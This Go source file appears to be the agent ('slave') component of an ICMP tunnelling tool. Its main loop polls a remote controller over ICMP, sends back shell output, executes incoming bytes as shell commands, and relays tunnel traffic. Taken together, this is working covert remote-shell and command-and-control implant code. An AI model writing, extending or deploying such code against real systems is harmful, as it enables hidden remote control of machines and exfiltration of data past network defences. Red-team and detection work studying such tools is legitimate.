package app

import (
	"context"
	"encoding/hex"
	"fmt"
	"io"
	"time"

	"protocol/icmp/internal/protocol"
	"protocol/icmp/internal/shell"
	"protocol/icmp/internal/transport"
	"protocol/icmp/internal/tunnel"
)

type SlaveConfig struct {
	Delay    time.Duration
	Timeout  time.Duration
	TestMode bool
	Logger   io.Writer
}

type SlaveService struct {
	Config   SlaveConfig
	Client   transport.PollClient
	Executor shell.Executor

	// Optional tunnel support
	TunnelManager  *tunnel.TunnelManager
}

func (s SlaveService) Run(ctx context.Context) error {
	if s.Executor == nil {
		return fmt.Errorf("executor is required")
	}
	if s.Client == nil {
		return fmt.Errorf("poll client is required")
	}

	for {
		outBuf, err := s.Executor.ReadOutput(ctx)
		if err != nil && err != io.EOF {
			return err
		}
		if len(outBuf) > 0 {
			s.log("%s\n", string(outBuf))
		}

		var payload []byte
		if s.TunnelManager != nil {
			if tunnelBuf := s.TunnelManager.TryDequeue(); tunnelBuf != nil {
				payload = append([]byte{protocol.ProtocolTunnel}, tunnelBuf...)
			}
		}
		if payload == nil {
			payload = append([]byte{protocol.ProtocolShell}, outBuf...)
		}

		replyData, err := s.Client.Exchange(ctx, payload)
		if err != nil {
			s.log("sendICMP error: %v\n", err)
		} else if len(replyData) > 0 {
			protoID := replyData[0]
			data := replyData[1:]
			if protoID == protocol.ProtocolTunnel {
				if s.TunnelManager != nil {
					s.TunnelManager.HandlePacket(data)
				}
			} else if protoID == protocol.ProtocolShell {
				if len(data) > 0 {
					s.log("%s\n", hex.Dump(data))
					s.log("------ %s\n", string(data))
					if err := s.Executor.Execute(data); err != nil {
						return err
					}
				}
			}
		}

		if s.Config.TestMode {
			return nil
		}
		if err := sleepContext(ctx, s.Config.Delay); err != nil {
			return err
		}
	}
}

func (s SlaveService) log(format string, args ...any) {
	if s.Config.Logger == nil {
		return
	}
	fmt.Fprintf(s.Config.Logger, format, args...)
}

func sleepContext(ctx context.Context, delay time.Duration) error {
	if delay <= 0 {
		return nil
	}
	timer := time.NewTimer(delay)
	defer timer.Stop()
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-timer.C:
		return nil
	}
}
